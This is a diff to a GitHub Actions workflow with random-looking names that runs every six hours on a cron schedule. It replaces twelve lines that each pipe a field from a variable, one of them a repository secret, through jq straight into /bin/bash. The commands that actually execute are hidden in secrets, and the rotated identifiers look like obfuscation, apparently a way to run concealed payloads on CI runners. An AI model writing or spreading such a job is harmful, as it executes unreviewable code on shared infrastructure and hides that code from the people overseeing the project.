@@ -2,8 +2,7 @@ name: busjkalj
 on:
   workflow_dispatch:
   schedule:
-    - cron: '15 4/6 * * *'
-
+    - cron: '23 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,18 +10,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: busjkalj
         env:
-          bgzxk22: ${{ secrets.bgzxk22 }}
+          zk3622: ${{ secrets.zk3622 }}
         run: |
-          echo $bgzxk22 | jq -r .ayhh2 | /bin/bash
-          echo $wqmgs782 | jq -r .uwsob42 | /bin/bash
-          echo $ssz0 | jq -r .mqge8 | /bin/bash
-          echo $rvnal39 | jq -r .caii1 | /bin/bash
-          echo $xp754 | jq -r .tq16 | /bin/bash
-          echo $ym26009 | jq -r .qqu59 | /bin/bash
-          echo $rc1 | jq -r .yilkb0 | /bin/bash
-          echo $mesym02521 | jq -r .ghq08 | /bin/bash
-          echo $d75 | jq -r .uzzyh2 | /bin/bash
-          echo $saq861 | jq -r .feh9 | /bin/bash
-          echo $uabyc2626 | jq -r .extgn714 | /bin/bash
-          echo $nj71 | jq -r .shiz09592 | /bin/bash
+          echo $zk3622 | jq -r .udp1 | /bin/bash
+          echo $m518 | jq -r .agr15256 | /bin/bash
+          echo $jnua539 | jq -r .nkfh720 | /bin/bash
+          echo $uklz7 | jq -r .hcbt9628 | /bin/bash
+          echo $rdbi116 | jq -r .sv95 | /bin/bash
+          echo $enzj6286 | jq -r .defxn4 | /bin/bash
+          echo $ufd5 | jq -r .uqw04 | /bin/bash
+          echo $ljw43 | jq -r .o1 | /bin/bash
+          echo $nx04 | jq -r .t71 | /bin/bash
+          echo $imnnu9047 | jq -r .xo64 | /bin/bash
+          echo $vboho7 | jq -r .mffbt77699 | /bin/bash
+          echo $k9867 | jq -r .ueqq0353 | /bin/bash
 
